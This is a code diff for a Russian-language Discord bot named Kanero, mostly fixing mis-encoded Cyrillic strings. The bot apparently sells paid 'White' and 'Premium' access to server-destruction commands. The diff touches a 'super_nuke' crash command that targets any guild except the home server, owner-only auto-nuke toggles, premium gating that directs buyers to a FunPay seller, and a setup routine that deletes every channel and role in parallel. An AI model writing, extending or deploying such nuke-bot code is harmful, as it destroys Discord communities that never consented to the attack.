-                await user.add_roles(role_premium, reason="fix_role: РІ Premium Р»РёСЃС‚Рµ")
-                changes.append("рџ’Ћ Premium вЂ” РІС‹РґР°РЅР°")
+                await user.add_roles(role_premium, reason="fix_role: в Premium листе")
+                changes.append("?? Premium — выдана")
             except Exception as e:
-                changes.append(f"рџ’Ћ Premium вЂ” РѕС€РёР±РєР°: {e}")
+                changes.append(f"?? Premium — ошибка: {e}")
         else:
-            changes.append("рџ’Ћ Premium вЂ” СѓР¶Рµ РµСЃС‚СЊ")
+            changes.append("?? Premium — уже есть")
     elif in_whitelist:
         if role_white and role_white not in user.roles:
             try:
-                await user.add_roles(role_white, reason="fix_role: РІ Whitelist")
-                changes.append("вњ… White вЂ” РІС‹РґР°РЅР°")
+                await user.add_roles(role_white, reason="fix_role: в Whitelist")
+                changes.append("? White — выдана")
             except Exception as e:
-                changes.append(f"вњ… White вЂ” РѕС€РёР±РєР°: {e}")
+                changes.append(f"? White — ошибка: {e}")
         else:
-            changes.append("вњ… White вЂ” СѓР¶Рµ РµСЃС‚СЊ")
+            changes.append("? White — уже есть")
     elif in_freelist:
         if role_user and role_user not in user.roles:
             try:
-                await user.add_roles(role_user, reason="fix_role: РІ Freelist")
-                changes.append("рџ‘Ґ User вЂ” РІС‹РґР°РЅР°")
+                await user.add_roles(role_user, reason="fix_role: в Freelist")
+                changes.append("?? User — выдана")
             except Exception as e:
-                changes.append(f"рџ‘Ґ User вЂ” РѕС€РёР±РєР°: {e}")
+                changes.append(f"?? User — ошибка: {e}")
         else:
-            changes.append("рџ‘Ґ User вЂ” СѓР¶Рµ РµСЃС‚СЊ")
+            changes.append("?? User — уже есть")
     else:
-        changes.append("вќЊ РќРµ РЅР°Р№РґРµРЅ РЅРё РІ РѕРґРЅРѕРј СЃРїРёСЃРєРµ")
+        changes.append("? Не найден ни в одном списке")
     
-    # РЈР±РёСЂР°РµРј Р»РёС€РЅРёРµ СЂРѕР»Рё
+    # Убираем лишние роли
     if role_premium and role_premium in user.roles and not in_premium and uid != config.OWNER_ID:
         try:
-            await user.remove_roles(role_premium, reason="fix_role: РЅРµ РІ Premium Р»РёСЃС‚Рµ")
-            changes.append("рџ’Ћ Premium вЂ” СѓР±СЂР°РЅР° (РЅРµ РІ СЃРїРёСЃРєРµ)")
+            await user.remove_roles(role_premium, reason="fix_role: не в Premium листе")
+            changes.append("?? Premium — убрана (не в списке)")
         except Exception as e:
-            changes.append(f"рџ’Ћ Premium вЂ” РѕС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ: {e}")
+            changes.append(f"?? Premium — ошибка удаления: {e}")
     
     if role_white and role_white in user.roles and not in_whitelist and not in_premium and uid != config.OWNER_ID:
         try:
-            await user.remove_roles(role_white, reason="fix_role: РЅРµ РІ Whitelist")
-            changes.append("вњ… White вЂ” СѓР±СЂР°РЅР° (РЅРµ РІ СЃРїРёСЃРєРµ)")
+            await user.remove_roles(role_white, reason="fix_role: не в Whitelist")
+            changes.append("? White — убрана (не в списке)")
         except Exception as e:
-            changes.append(f"вњ… White вЂ” РѕС€РёР±РєР° СѓРґР°Р»РµРЅРёСЏ: {e}")
+            changes.append(f"? White — ошибка удаления: {e}")
     
-    # Р¤РѕСЂРјРёСЂСѓРµРј РѕС‚РІРµС‚
+    # Формируем ответ
     if not changes:
-        description = "вњ… Р’СЃРµ СЂРѕР»Рё РІ РїРѕСЂСЏРґРєРµ, РёР·РјРµРЅРµРЅРёР№ РЅРµ С‚СЂРµР±СѓРµС‚СЃСЏ."
+        description = "? Все роли в порядке, изменений не требуется."
     else:
         description = "\n".join(changes)
     
     embed = discord.Embed(
-        title=f"рџ”§ РџСЂРѕРІРµСЂРєР° СЂРѕР»РµР№ вЂ” {user.display_name}",
+        title=f"?? Проверка ролей — {user.display_name}",
         description=description,
         color=0x0a0a0a
     )
     
-    # РџРѕРєР°Р·С‹РІР°РµРј С‚РµРєСѓС‰РёРµ СЂРѕР»Рё Рё СЃС‚Р°С‚СѓСЃ РІ СЃРїРёСЃРєР°С…
+    # Показываем текущие роли и статус в списках
     status_lines = []
     if in_premium:
-        status_lines.append("рџ’Ћ Premium Р»РёСЃС‚")
+        status_lines.append("?? Premium лист")
     if in_whitelist:
-        status_lines.append("вњ… Whitelist")
+        status_lines.append("? Whitelist")
     if in_freelist:
-        status_lines.append("рџ“‹ Freelist")
+        status_lines.append("?? Freelist")
     
     if status_lines:
-        embed.add_field(name="рџ“‹ РЎС‚Р°С‚СѓСЃ РІ СЃРїРёСЃРєР°С…", value="\n".join(status_lines), inline=True)
+        embed.add_field(name="?? Статус в списках", value="\n".join(status_lines), inline=True)
     
-    current_roles = [role.name for role in user.roles if role.name in ["рџ’Ћ Premium", "вњ… White", "рџ‘Ґ User", "рџ‘¤ Guest"]]
+    current_roles = [role.name for role in user.roles if role.name in ["?? Premium", "? White", "?? User", "?? Guest"]]
     if current_roles:
-        embed.add_field(name="рџЋ­ РўРµРєСѓС‰РёРµ СЂРѕР»Рё", value="\n".join(current_roles), inline=True)
+        embed.add_field(name="?? Текущие роли", value="\n".join(current_roles), inline=True)
     
-    embed.set_footer(text="в пёЏ Kanero  |  !fix_role [@РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ]")
+    embed.set_footer(text="?? Kanero  |  !fix_role [@пользователь]")
     await ctx.send(embed=embed)
 
 
@@ -2045,20 +2045,20 @@ async def list_clear(ctx):
     save_premium()
     save_freelist()
     embed = discord.Embed(
-        title="рџ—‘пёЏ Р’СЃРµ СЃРїРёСЃРєРё РѕС‡РёС‰РµРЅС‹",
+        title="??? Все списки очищены",
         description=(
-            f"Whitelist: СѓРґР°Р»РµРЅРѕ **{wl_removed}**\n"
-            f"Premium: СѓРґР°Р»РµРЅРѕ **{pm_removed}**\n"
-            f"Freelist: СѓРґР°Р»РµРЅРѕ **{fl_removed}**\n"
-            "РћРІРЅРµСЂС‹ СЃРѕС…СЂР°РЅРµРЅС‹."
+            f"Whitelist: удалено **{wl_removed}**\n"
+            f"Premium: удалено **{pm_removed}**\n"
+            f"Freelist: удалено **{fl_removed}**\n"
+            "Овнеры сохранены."
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ PREMIUM COMMANDS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- PREMIUM COMMANDS --------------------------------------
 
 def premium_check():
     async def predicate(ctx):
@@ -2066,20 +2066,20 @@ def premium_check():
             return False
         if not is_whitelisted(ctx.author.id):
             embed = discord.Embed(
-                title="в пёЏ Р”РћРЎРўРЈРџ Р—РђРџР Р•Р©РЃРќ",
-                description="РЈ С‚РµР±СЏ РЅРµС‚ РїРѕРґРїРёСЃРєРё.\nР—Р° РїРѕРєСѓРїРєРѕР№ РїРёС€Рё РІ Р›РЎ: **davaidkatt**",
+                title="?? ДОСТУП ЗАПРЕЩЁН",
+                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="в пёЏ Kanero")
+            embed.set_footer(text="?? Kanero")
             await ctx.send(embed=embed)
             return False
         if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
             embed = discord.Embed(
-                title="рџ’Ћ PREMIUM Р¤РЈРќРљР¦РРЇ",
-                description="Р­С‚Р° РєРѕРјР°РЅРґР° РґРѕСЃС‚СѓРїРЅР° С‚РѕР»СЊРєРѕ **Premium** РїРѕР»СЊР·РѕРІР°С‚РµР»СЏРј.\n\nР—Р° РїРѕРєСѓРїРєРѕР№ РїРёС€Рё РІ Р›РЎ: **davaidkatt**",
+                title="?? PREMIUM ФУНКЦИЯ",
+                description="Эта команда доступна только **Premium** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="в пёЏ Kanero")
+            embed.set_footer(text="?? Kanero")
             await ctx.send(embed=embed)
             return False
         return True
@@ -2093,12 +2093,12 @@ async def super_nuke(ctx, *, text: str = None):
     if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
         return
     if is_guild_blocked(guild.id):
-        embed = discord.Embed(description="рџ”’ Р­С‚РѕС‚ СЃРµСЂРІРµСЂ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.", color=0x0a0a0a)
-        embed.set_footer(text="в пёЏ Kanero")
+        embed = discord.Embed(description="?? Этот сервер заблокирован.", color=0x0a0a0a)
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
     if nuke_running.get(guild.id):
-        embed = discord.Embed(description="вљЎ РљСЂР°С€ СѓР¶Рµ Р·Р°РїСѓС‰РµРЅ РЅР° СЌС‚РѕРј СЃРµСЂРІРµСЂРµ.", color=0x0a0a0a)
+        embed = discord.Embed(description="? Краш уже запущен на этом сервере.", color=0x0a0a0a)
         await ctx.send(embed=embed)
         return
     nuke_running[guild.id] = True
@@ -2110,7 +2110,7 @@ async def super_nuke(ctx, *, text: str = None):
     asyncio.create_task(log_nuke(guild, ctx.author, "super_nuke"))
 
 
-# в”Ђв”Ђв”Ђ OWNER-ONLY NUKE COMMANDS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- OWNER-ONLY NUKE COMMANDS ------------------------------
 
 AUTO_OWNER_NUKE = False
 AUTO_OWNER_NUKE_TEXT = None
@@ -2125,9 +2125,9 @@ def save_auto_owner_nuke():
 
 @bot.command(name="auto_off")
 async def auto_off(ctx):
-    """Р’С‹РєР»СЋС‡РёС‚СЊ РІСЃРµ Р°РІС‚Рѕ РЅСЋРєРё. РўРѕР»СЊРєРѕ РґР»СЏ РІР»Р°РґРµР»СЊС†Р° СЃРµСЂРІРµСЂР°."""
+    """Выключить все авто нюки. Только для владельца сервера."""
     global AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE
-    # РўРѕР»СЊРєРѕ РІР»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+    # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
     config.AUTO_NUKE = False
@@ -2136,119 +2136,119 @@ async def auto_off(ctx):
     AUTO_SUPERPR_NUKE = False
     save_auto_superpr_nuke()
     embed = discord.Embed(
-        title="рџ”ґ Р’СЃРµ Р°РІС‚Рѕ РЅСЋРєРё РІС‹РєР»СЋС‡РµРЅС‹",
+        title="?? Все авто нюки выключены",
         description=(
-            "вќЊ `auto_nuke` вЂ” РІС‹РєР»СЋС‡РµРЅ\n"
-            "вќЊ `auto_super_nuke` вЂ” РІС‹РєР»СЋС‡РµРЅ\n"
-            "вќЊ `auto_superpr_nuke` вЂ” РІС‹РєР»СЋС‡РµРЅ"
+            "? `auto_nuke` — выключен\n"
+            "? `auto_super_nuke` — выключен\n"
+            "? `auto_superpr_nuke` — выключен"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="auto_info")
 async def auto_info(ctx):
-    """РџРѕРєР°Р·Р°С‚СЊ СЃС‚Р°С‚СѓСЃ РІСЃРµС… Р°РІС‚Рѕ РЅСЋРєРѕРІ. РўРѕР»СЊРєРѕ РґР»СЏ РІР»Р°РґРµР»СЊС†Р° СЃРµСЂРІРµСЂР°."""
-    # РўРѕР»СЊРєРѕ РІР»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+    """Показать статус всех авто нюков. Только для владельца сервера."""
+    # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
 
     def st(val):
-        return "вњ… Р’РєР»СЋС‡С‘РЅ" if val else "вќЊ Р’С‹РєР»СЋС‡РµРЅ"
+        return "? Включён" if val else "? Выключен"
 
-    embed = discord.Embed(title="рџ“Љ РЎС‚Р°С‚СѓСЃ Р°РІС‚Рѕ РЅСЋРєРѕРІ", color=0x0a0a0a)
+    embed = discord.Embed(title="?? Статус авто нюков", color=0x0a0a0a)
     embed.add_field(
-        name="рџ”„ auto_nuke",
+        name="?? auto_nuke",
         value=f"{st(config.AUTO_NUKE)}\n`!auto_nuke on/off`",
         inline=True
     )
     embed.add_field(
-        name="рџ’Ћ auto_super_nuke",
-        value=f"{st(AUTO_SUPER_NUKE)}\nРўРµРєСЃС‚: `{AUTO_SUPER_NUKE_TEXT or 'РґРµС„РѕР»С‚РЅС‹Р№'}`\n`!auto_super_nuke on/off`",
+        name="?? auto_super_nuke",
+        value=f"{st(AUTO_SUPER_NUKE)}\nТекст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n`!auto_super_nuke on/off`",
         inline=False
     )
     embed.add_field(
-        name="вљЎ auto_superpr_nuke",
-        value=f"{st(AUTO_SUPERPR_NUKE)}\nРўРµРєСЃС‚: `{AUTO_SUPERPR_NUKE_TEXT or 'РґРµС„РѕР»С‚РЅС‹Р№'}`\n`!auto_superpr_nuke on/off`",
+        name="? auto_superpr_nuke",
+        value=f"{st(AUTO_SUPERPR_NUKE)}\nТекст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n`!auto_superpr_nuke on/off`",
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  !auto_off вЂ” РІС‹РєР»СЋС‡РёС‚СЊ РІСЃРµ")
+    embed.set_footer(text="?? Kanero  |  !auto_off — выключить все")
     await ctx.send(embed=embed)
 
 
 async def _post_news_and_sell(guild: discord.Guild):
-    """РџРѕСЃС‚РёС‚ СЃРѕРѕР±С‰РµРЅРёРµ РІ РЅРѕРІРѕСЃС‚Рё Рё sell РїРѕСЃР»Рµ setup/setup_update. РџСЂРѕРІРµСЂСЏРµС‚ РµСЃС‚СЊ Р»Рё СѓР¶Рµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р°."""
-    news_ch = discord.utils.find(lambda c: "РЅРѕРІРѕСЃС‚" in c.name.lower() or "news" in c.name.lower(), guild.text_channels)
+    """Постит сообщение в новости и sell после setup/setup_update. Проверяет есть ли уже сообщение бота."""
+    news_ch = discord.utils.find(lambda c: "новост" in c.name.lower() or "news" in c.name.lower(), guild.text_channels)
     sell_ch = discord.utils.find(lambda c: "sell" in c.name.lower(), guild.text_channels)
     changelog_ch = discord.utils.find(lambda c: "changelog" in c.name.lower(), guild.text_channels)
     addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
-    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "С‚РёРєРµС‚" in c.name.lower(), guild.text_channels)
+    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
 
-    # РћР±РЅРѕРІР»СЏРµРј СЃСЃС‹Р»РєРё РЅР° РєР°РЅР°Р»С‹ (РµСЃР»Рё РєР°РЅР°Р» РЅРµ СЃСѓС‰РµСЃС‚РІСѓРµС‚ вЂ” "РЅРµРёР·РІРµСЃС‚РЅР°")
-    cl_mention = changelog_ch.mention if changelog_ch else "РЅРµРёР·РІРµСЃС‚РЅР°"
-    ab_mention = addbot_ch.mention if addbot_ch else "РЅРµРёР·РІРµСЃС‚РЅР°"
-    sell_mention = sell_ch.mention if sell_ch else "РЅРµРёР·РІРµСЃС‚РЅР°"
-    ticket_mention = ticket_ch.mention if ticket_ch else "РЅРµРёР·РІРµСЃС‚РЅР°"
+    # Обновляем ссылки на каналы (если канал не существует — "неизвестна")
+    cl_mention = changelog_ch.mention if changelog_ch else "неизвестна"
+    ab_mention = addbot_ch.mention if addbot_ch else "неизвестна"
+    sell_mention = sell_ch.mention if sell_ch else "неизвестна"
+    ticket_mention = ticket_ch.mention if ticket_ch else "неизвестна"
 
-    # РќРѕРІРѕСЃС‚Рё вЂ” РїСЂРѕРІРµСЂСЏРµРј РµСЃС‚СЊ Р»Рё СѓР¶Рµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р°
+    # Новости — проверяем есть ли уже сообщение бота
     if news_ch:
         try:
-            # РџСЂРѕРІРµСЂСЏРµРј РµСЃС‚СЊ Р»Рё СѓР¶Рµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р° СЃ embed "Р‘РѕС‚ РѕР±РЅРѕРІР»С‘РЅ!"
+            # Проверяем есть ли уже сообщение бота с embed "Бот обновлён!"
             bot_message_exists = False
             async for message in news_ch.history(limit=50):
                 if (message.author == guild.me and message.embeds and 
                     len(message.embeds) > 0 and 
-                    "Р‘РѕС‚ РѕР±РЅРѕРІР»С‘РЅ!" in message.embeds[0].title):
+                    "Бот обновлён!" in message.embeds[0].title):
                     bot_message_exists = True
                     break
             
-            # Р•СЃР»Рё СЃРѕРѕР±С‰РµРЅРёСЏ РЅРµС‚ - РѕС‚РїСЂР°РІР»СЏРµРј РЅРѕРІРѕРµ
+            # Если сообщения нет - отправляем новое
             if not bot_message_exists:
                 embed = discord.Embed(
-                    title="рџ”” Р‘РѕС‚ РѕР±РЅРѕРІР»С‘РЅ!",
+                    title="?? Бот обновлён!",
                     description=(
-                        f"рџ“‹ **РСЃС‚РѕСЂРёСЏ РёР·РјРµРЅРµРЅРёР№:** {cl_mention}\n\n"
-                        f"рџ†“ **Р‘РµСЃРїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї (freelist):**\n"
-                        f"РќР°РїРёС€Рё РІ {ab_mention}\n\n"
-                        f"вњ…рџ’Ћ **White / Premium Рё РІС‹С€Рµ:**\n"
-                        f"Р—Р°РіР»СЏРЅРё РІ {sell_mention}\n\n"
-                        f"[РќР°С€ СЃРµСЂРІРµСЂ](https://discord.gg/aud6wwYVRd)"
+                        f"?? **История изменений:** {cl_mention}\n\n"
+                        f"?? **Бесплатный доступ (freelist):**\n"
+                        f"Напиши в {ab_mention}\n\n"
+                        f"??? **White / Premium и выше:**\n"
+                        f"Загляни в {sell_mention}\n\n"
+                        f"[Наш сервер](https://discord.gg/nNTB37QNCG)"
                     ),
                     color=0x0a0a0a
                 )
-                embed.set_footer(text="в пёЏ Kanero")
+                embed.set_footer(text="?? Kanero")
                 await news_ch.send(content="@everyone", embed=embed)
         except Exception:
             pass
 
-    # Sell вЂ” РїСЂРѕРІРµСЂСЏРµРј РµСЃС‚СЊ Р»Рё СѓР¶Рµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р°
+    # Sell — проверяем есть ли уже сообщение бота
     if sell_ch:
         try:
-            # РџСЂРѕРІРµСЂСЏРµРј РµСЃС‚СЊ Р»Рё СѓР¶Рµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р° СЃ embed "РљСѓРїРёС‚СЊ РґРѕСЃС‚СѓРї вЂ” Kanero"
+            # Проверяем есть ли уже сообщение бота с embed "Купить доступ — Kanero"
             bot_message_exists = False
             async for message in sell_ch.history(limit=50):
                 if (message.author == guild.me and message.embeds and 
                     len(message.embeds) > 0 and 
-                    "РљСѓРїРёС‚СЊ РґРѕСЃС‚СѓРї вЂ” Kanero" in message.embeds[0].title):
+                    "Купить доступ — Kanero" in message.embeds[0].title):
                     bot_message_exists = True
                     break
             
-            # Р•СЃР»Рё СЃРѕРѕР±С‰РµРЅРёСЏ РЅРµС‚ - РѕС‚РїСЂР°РІР»СЏРµРј РЅРѕРІРѕРµ
+            # Если сообщения нет - отправляем новое
             if not bot_message_exists:
                 embed = discord.Embed(
-                    title="рџ›’ РљСѓРїРёС‚СЊ РґРѕСЃС‚СѓРї вЂ” Kanero",
+                    title="?? Купить доступ — Kanero",
                     description=(
-                        "**вњ… White / рџ’Ћ Premium** вЂ” РєСѓРїРёС‚СЊ РЅР° FunPay:\n"
+                        "**? White / ?? Premium** — купить на FunPay:\n"
                         "https://funpay.com/users/16928925/ \n\n"
-                        "**вќ“ РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ?**\n"
-                        f"РЎРѕР·РґР°Р№ С‚РёРєРµС‚: {ticket_mention}\n\n"
-                        f"**рџ“‹ Freelist (Р±РµСЃРїР»Р°С‚РЅРѕ)** вЂ” РЅР°РїРёС€Рё РІ {ab_mention}"
+                        "**? Нужна помощь?**\n"
+                        f"Создай тикет: {ticket_mention}\n\n"
+                        f"**?? Freelist (бесплатно)** — напиши в {ab_mention}"
                     ),
                     color=0x0a0a0a
                 )
-                embed.set_footer(text="в пёЏ Kanero  |  White В· Premium")
+                embed.set_footer(text="?? Kanero  |  White · Premium")
                 await sell_ch.send("@everyone", embed=embed)
         except Exception:
             pass
@@ -2256,36 +2256,36 @@ async def _post_news_and_sell(guild: discord.Guild):
 
 @bot.command(name="setup")
 async def setup(ctx):
-    """РџРµСЂРµСЃРѕР·РґР°С‚СЊ СЃС‚СЂСѓРєС‚СѓСЂСѓ СЃРµСЂРІРµСЂР°. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂРѕРІ (OWNER_ID + OWNER_WHITELIST)."""
+    """Пересоздать структуру сервера. Только для овнеров (OWNER_ID + OWNER_WHITELIST)."""
     if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
         embed = discord.Embed(
-            description="вќЊ Р­С‚Р° РєРѕРјР°РЅРґР° РґРѕСЃС‚СѓРїРЅР° С‚РѕР»СЊРєРѕ **РѕРІРЅРµСЂР°Рј** Р±РѕС‚Р°.",
+            description="? Эта команда доступна только **овнерам** бота.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero")
+        embed.set_footer(text="?? Kanero")
         await ctx.send(embed=embed)
         return
     guild = ctx.guild
-    msg = await ctx.send("вљ™пёЏ РџРµСЂРµСЃРѕР·РґР°СЋ СЃС‚СЂСѓРєС‚СѓСЂСѓ СЃРµСЂРІРµСЂР°... (СѓСЃРєРѕСЂРµРЅРЅР°СЏ РІРµСЂСЃРёСЏ ~15-20 СЃРµРє)")
+    msg = await ctx.send("?? Пересоздаю структуру сервера... (ускоренная версия ~15-20 сек)")
 
-    # в”Ђв”Ђ 1. РџРђР РђР›Р›Р•Р›Р¬РќРћР• СѓРґР°Р»РµРЅРёРµ РІСЃРµС… РєР°РЅР°Р»РѕРІ Рё СЂРѕР»РµР№ в”Ђв”Ђ
+    # -- 1. ПАРАЛЛЕЛЬНОЕ удаление всех каналов и ролей --
     delete_tasks = []
     
-    # Р”РѕР±Р°РІР»СЏРµРј Р·Р°РґР°С‡Рё СѓРґР°Р»РµРЅРёСЏ РєР°РЅР°Р»РѕРІ
+    # Добавляем задачи удаления каналов
     for ch in guild.channels:
         delete_tasks.append(ch.delete())
     
-    # Р”РѕР±Р°РІР»СЏРµРј Р·Р°РґР°С‡Рё СѓРґР°Р»РµРЅРёСЏ СЂРѕР»РµР№
+    # Добавляем задачи удаления ролей
     bot_role = guild.me.top_role
     for r in guild.roles:
         if r < bot_role and not r.is_default():
             delete_tasks.append(r.delete())
     
-    # Р’С‹РїРѕР»РЅСЏРµРј РІСЃРµ СѓРґР°Р»РµРЅРёСЏ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ
+    # Выполняем все удаления параллельно
     if delete_tasks:
         await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    # в”Ђв”Ђ 2. РџРђР РђР›Р›Р•Р›Р¬РќРћР• СЃРѕР·РґР°РЅРёРµ СЂРѕР»РµР№ в”Ђв”Ђ
+    # -- 2. ПАРАЛЛЕЛЬНОЕ создание ролей --
     guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False)
     user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False)
     white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False)
@@ -2293,23 +2293,23 @@ async def setup(ctx):
     owner_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, manage_channels=True, manage_roles=True, manage_webhooks=True, kick_members=True, ban_members=True, manage_nicknames=True, view_audit_log=True, mention_everyone=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, mute_members=True, deafen_members=True, priority_speaker=True)
     dev_perms     = discord.Permissions(administrator=True)
 
-    # РЎРѕР·РґР°РµРј РІСЃРµ СЂРѕР»Рё РїР°СЂР°Р»Р»РµР»СЊРЅРѕ
+    # Создаем все роли параллельно
     role_tasks = [
-        guild.create_role(name="рџ‘¤ Guest",     color=discord.Color.from_rgb(120, 120, 120), permissions=guest_perms,   hoist=False, mentionable=False),
-        guild.create_role(name="рџ‘Ґ User",      color=discord.Color.from_rgb(180, 180, 180), permissions=user_perms,    hoist=True,  mentionable=False),
-        guild.create_role(name="вњ… White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False),
-        guild.create_role(name="рџ’Ћ Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False),
-        guild.create_role(name="рџ§Є Tester",    color=discord.Color.from_rgb(255, 165, 0),   permissions=premium_perms, hoist=True,  mentionable=False),
-        guild.create_role(name="рџ›ЎпёЏ Moderator", color=discord.Color.from_rgb(255, 140, 0),   permissions=premium_perms, hoist=True,  mentionable=False),
-        guild.create_role(name="рџЋ¬ Media",      color=discord.Color.from_rgb(255, 105, 180), permissions=premium_perms, hoist=True,  mentionable=False),
-        guild.create_role(name="рџ¤ќ Friend",     color=discord.Color.from_rgb(50, 205, 50),   permissions=premium_perms, hoist=True,  mentionable=False),
-        guild.create_role(name="рџ‘‘ Owner",      color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False),
-        guild.create_role(name="рџ”§ Developer",  color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
+        guild.create_role(name="?? Guest",     color=discord.Color.from_rgb(120, 120, 120), permissions=guest_perms,   hoist=False, mentionable=False),
+        guild.create_role(name="?? User",      color=discord.Color.from_rgb(180, 180, 180), permissions=user_perms,    hoist=True,  mentionable=False),
+        guild.create_role(name="? White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False),
+        guild.create_role(name="?? Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False),
+        guild.create_role(name="?? Tester",    color=discord.Color.from_rgb(255, 165, 0),   permissions=premium_perms, hoist=True,  mentionable=False),
+        guild.create_role(name="??? Moderator", color=discord.Color.from_rgb(255, 140, 0),   permissions=premium_perms, hoist=True,  mentionable=False),
+        guild.create_role(name="?? Media",      color=discord.Color.from_rgb(255, 105, 180), permissions=premium_perms, hoist=True,  mentionable=False),
+        guild.create_role(name="?? Friend",     color=discord.Color.from_rgb(50, 205, 50),   permissions=premium_perms, hoist=True,  mentionable=False),
+        guild.create_role(name="?? Owner",      color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False),
+        guild.create_role(name="?? Developer",  color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
     ]
     
     roles_result = await asyncio.gather(*role_tasks, return_exceptions=True)
     
-    # РР·РІР»РµРєР°РµРј СЃРѕР·РґР°РЅРЅС‹Рµ СЂРѕР»Рё РёР· СЂРµР·СѓР»СЊС‚Р°С‚РѕРІ
+    # Извлекаем созданные роли из результатов
     role_guest = roles_result[0] if not isinstance(roles_result[0], Exception) else None
     role_user = roles_result[1] if not isinstance(roles_result[1], Exception) else None
     role_white = roles_result[2] if not isinstance(roles_result[2], Exception) else None
@@ -2321,20 +2321,20 @@ async def setup(ctx):
     role_owner = roles_result[8] if not isinstance(roles_result[8], Exception) else None
     role_dev = roles_result[9] if not isinstance(roles_result[9], Exception) else None
     
-    # РЈСЃС‚Р°РЅР°РІР»РёРІР°РµРј РіР»РѕР±Р°Р»СЊРЅС‹Р№ ID СЂРѕР»Рё Guest
+    # Устанавливаем глобальный ID роли Guest
     global AUTO_ROLE_ID
     if role_guest:
         AUTO_ROLE_ID = role_guest.id
     
-    # РЎРѕР·РґР°РµРј СЂРѕР»СЊ Р±РѕС‚Р° РѕС‚РґРµР»СЊРЅРѕ
-    role_bot = await guild.create_role(name="рџ¤– Kanero", color=discord.Color.from_rgb(0, 200, 150), permissions=dev_perms, hoist=True, mentionable=False)
+    # Создаем роль бота отдельно
+    role_bot = await guild.create_role(name="?? Kanero", color=discord.Color.from_rgb(0, 200, 150), permissions=dev_perms, hoist=True, mentionable=False)
 
     try:
         await guild.me.add_roles(role_bot)
     except Exception:
         pass
 
